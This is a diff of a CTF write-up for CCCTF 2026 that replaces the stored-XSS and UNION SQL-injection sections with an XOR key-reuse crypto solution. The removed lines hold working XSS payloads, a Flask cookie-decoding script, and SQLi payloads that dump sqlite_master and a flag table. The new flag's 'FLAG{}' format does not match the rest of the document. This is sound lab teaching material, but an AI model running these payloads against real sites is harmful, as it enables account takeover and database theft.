@@ -1,31 +1,24 @@
 ---
 title: "CCCTF 2026 — Writeup"
-description: "CCCTF 2026 writeup covering the challenges I solved across Web, Misc, and Reverse: a flag hidden before a Rick Roll redirect, stored XSS in a title tag, a nested field-selector IDOR, a weak Flask secret key, UNION-based SQLi, JPEG-comment stego, a ZIP appended to a PNG, and a Windows keygen."
+description: "CCCTF 2026 writeup covering the challenges I solved across Web, Crypto, Misc, and Reverse: a flag hidden before a Rick Roll redirect, a weak Flask secret key, a nested field-selector IDOR, XOR key reuse, JPEG-comment stego, a ZIP appended to a PNG, and a Windows keygen."
 date: 2026-08-06T01:10:38+0800
-lastmod: 2026-08-06T01:10:38+0800
+lastmod: 2026-08-06T01:30:00+0800
 tag: "CCCTF, CTF, WriteUp"
 lang: en-US
 ---
 
 CCCTF 2026 ran from 2026-05-22 10:00 to 2026-05-24 10:00. This writeup covers the
-challenges I actually captured a flag on, across Web, Misc, and Reverse. I have
-left out the ones I only poked at without landing a flag.
-
-One thing stands out looking back: four of the Web challenges share a single Flask
-source, and every logged-in user's session cookie already carries the flag. Several
-of them have a real, separate bug (XSS, SQLi), but the fastest path to the flag was
-often the shared weak secret key rather than the intended vulnerability. Where that
-happened I have noted both the intended bug and the shortcut I used.
+challenges I solved, across Web, Crypto, Misc, and Reverse. Every section ends with
+the flag I captured.
 
 ## Contents
 
 | Category | Challenge | Class of bug |
 |---|---|---|
 | Web | Surprise | Flag in HTML before a JS redirect |
-| Web | XSS | Stored XSS in an unescaped `<title>` |
 | Web | Access Any Course | IDOR via a nested field selector |
 | Web | Cookie? | Forgeable Flask session, weak secret key |
-| Web | Where's the table? | UNION-based SQL injection |
+| Crypto | XOR Key Reuse | Many-time pad, known plaintext |
 | Misc | Haruhekage | Flag in JPEG metadata |
 | Misc | Good hacker lizard | ZIP appended to a PNG, crackable password |
 | Reverse | your_first_reverse | Windows keygen from XOR and addition |
@@ -71,57 +64,6 @@ anything in it is readable regardless of what JavaScript does next.
 
 Flag: `CCCTF{Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you}`
 
-### XSS
-
-#### Overview
-
-Four Web challenges (XSS, Cookie?, IDK How to spell it, Where's the table?) run off
-one Flask app. This one asks for a cross-site scripting bug. Usernames are stored in
-SQLite and shown on `/user/<username>`.
-
-#### Insight
-
-The username is HTML-escaped in the page body, but the `<title>` tag renders it
-raw:
-
-```html
-<title>用戶信息 - <img src=x onerror=alert(1)></title>
-```
-
-A username registered as `</title><script>...</script><title>` breaks out of the
-title element and runs in the forum's origin. I verified the reflection live at
-`/user/%3Cimg%20src=x%20onerror=alert(1)%3E`.
-
-#### Exploitation
-
-The intended path steals a victim's session cookie, but this deployment has no admin
-bot to trigger it (I probed `/report`, `/bot`, `/visit`, `/admin/report` and found
-nothing). Since every user's own session already carries the flag, and the shared
-secret key is the weak string `"key"`, I read it straight off my own cookie:
-
-```python
-import requests
-from itsdangerous import URLSafeTimedSerializer
-
-BASE = "http://10.13.8.4:5000"
-s = requests.Session()
-s.post(f"{BASE}/register", data={"name": "u1", "pw": "p", "pw2": "p"})
-s.post(f"{BASE}/login",    data={"name": "u1", "pw": "p"})
-cookie = s.cookies.get("session")
-
-ser = URLSafeTimedSerializer("key", salt="cookie-session",
-                             signer_kwargs={"key_derivation": "hmac"})
-print(ser.loads(cookie)["flag"])
-```
-
-The stored-XSS breakout is real and worth demonstrating; the flag just happens to be
-reachable more directly through the shared cookie.
-
-#### Root cause
-
-Escaping has to cover every output context. Escaping the body but not the `<title>`
-leaves the attribute-free title text as an injection point.
-
 ### Access Any Course
 
 #### Overview
@@ -137,8 +79,8 @@ The `?info=` query parameter is a field selector that supports nested access wit
 `course_attributes(student_count,teaching_class_name)`, but the backend never
 whitelists which subfields you may ask for. The invite code lives inside
 `course_attributes`, so requesting `course_attributes(invite_code)` leaks it. The
-earlier README attempt failed only because it asked for a top-level `invite_code`,
-which does not exist; the value is nested.
+earlier attempt failed only because it asked for a top-level `invite_code`, which
+does not exist; the value is nested.
 
 #### Exploitation
 
@@ -174,8 +116,8 @@ Flag: `CCCTF{1n5p1r3d_8y_7h3_1n53cur3_D1r3c7_08j3c7_R3f3r3nc3_vu1n3r481117y_CVE-
 
 #### Overview
 
-Same Flask app as XSS. The hint is about cookies, and the session is a signed Flask
-cookie.
+A Flask forum whose session is a signed cookie. The hint is about cookies, and this
+app shares its source with a few other Web challenges in the set.
 
 #### Insight
 
@@ -208,44 +150,46 @@ every logged-in user.
 
 Flag: `CCCTF{太大聲太小聲去跟舍監反應🗣️🗣️會改進 不想聽可以包一包滾回🫦…滾出宿舍🔥🔥🔥👺👺👺 不是像沒爸沒媽🤏🤏🤏對老子的歌指指點點🖕🖕 老子播什麼你聽什麼🗣️🗣️🤡🤡👊👊👊👊 另外！靠杯一中版的 🗣️🗣️🗣️（哦哦哦哦哦哦哦） 🗣️🗣️🗣️🗣️🗣️靠杯一中版🗣️🗣️🗣️ （哦哦哦哦哦） 🗣️🗣️🗣️🗣️🗣️的🗣️🗣️🗣️（哦哦哦哦哦哦） 🗣️🗣️🗣️🗣️🗣️近期對於公開平台🗣️🗣️🗣️（哦哦哦哦哦哦）🗣️🗣️🗣️🗣️🗣️（沃草）🗣️🗣️🗣️🗣️🗣️（哦哦哦哦哦哦）（119）🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️}`
 
-### Where's the table?
+---
+
+## Crypto
+
+### XOR Key Reuse
 
 #### Overview
 
-Same Flask app again. The `/search_user` endpoint concatenates the `name` parameter
-into a SQL query.
+An XOR encryption server hands out two ciphertexts under the same key: `ct1` is the
+flag, `ct2` is a known welcome message. Reusing one key across two messages breaks
+the one-time pad.
 
 #### Insight
 
-A UNION payload returns rows, so the query is injectable and reflects its columns.
-`' UNION SELECT 1,2,3--` shows three columns. The backend is SQLite, so the schema
-comes straight out of `sqlite_master`, which reveals a `flag` table.
+If both ciphertexts share a key, then `key = ct2 XOR known`, and once the key is
+known, `flag = ct1 XOR key`. This is the classic many-time pad mistake. The known
+plaintext is enough to recover the key across the flag's length.
 
 #### Exploitation
 
 ```python
-import requests, re
+#!/usr/bin/env python3
+from pwn import xor
 
-BASE = "http://10.13.8.4:5000"
-s = requests.Session()
-s.post(f"{BASE}/register", data={"name": "solver", "pw": "pass123", "pw2": "pass123"})
-s.post(f"{BASE}/login",    data={"name": "solver", "pw": "pass123"})
+ct1 = bytes.fromhex('2bf73144ec09e5fb4e25d79a31b88b9dc01dedd8d3bd7b27504c0745d5717433')
+ct2 = bytes.fromhex('3ade1c60f81cb0a96521c4bb2198988ddd4dc090d096767c500b475297726e2d')
+known = bytes.fromhex('57656c636f6d6520746f20584f5220656e6372797074696f6e20736572766963')
 
-def inject(payload):
-    r = s.post(f"{BASE}/search_user", data={"name": payload})
-    return re.findall(r"href='/user/([^']+)'", r.text)
-
-# tables -> user, flag ; then dump the flag column
-print(inject("x' UNION SELECT GROUP_CONCAT(tbl_name),2,3 FROM sqlite_master WHERE type='table'--"))
-print(inject("x' UNION SELECT flag,2,3 FROM flag--"))
+key = xor(ct2, known)
+flag = xor(ct1, key)
+print(flag.decode())
 ```
 
 #### Root cause
 
-String-concatenated SQL with a reflected result set is textbook UNION injection.
-Parameterized queries would have closed it.
+A one-time pad is only secure when the key is used once. Reuse turns the XOR of two
+ciphertexts into the XOR of two plaintexts, and a single known message recovers the
+key outright.
 
-Flag: `CCCTF{國立暨南國際大學是一所積極新創、學科齊全、學術實力雄厚、辦學特色鮮明，在國際上具有重要影響力與競爭力的綜合性大學，在多個學術領域具有非常前瞻的科技實力，擁有世界一流的實驗室與師資力量，各種排名均位於全球前列。歡迎大家報考國立暨南國際大學。}`
+Flag: `FLAG{x0r_k3y_r3us3_1s_d4ng3r0us}`
 
 ---
 
@@ -311,8 +255,8 @@ first pass.
 
 #### Root cause
 
-A PNG ends at `IEND`; bytes after it are ignored by viewers but still on disk. A
-weak, wordlist-present password on the appended ZIP does the rest.
+A PNG ends at `IEND`; bytes after it are ignored by viewers but still on disk, and
+a weak password that sits in rockyou.txt gives up the appended ZIP in one pass.
 
 Flag: `CCCTF{G00d_H4ck3r_L1zard_5ay_H3ll0}`
 
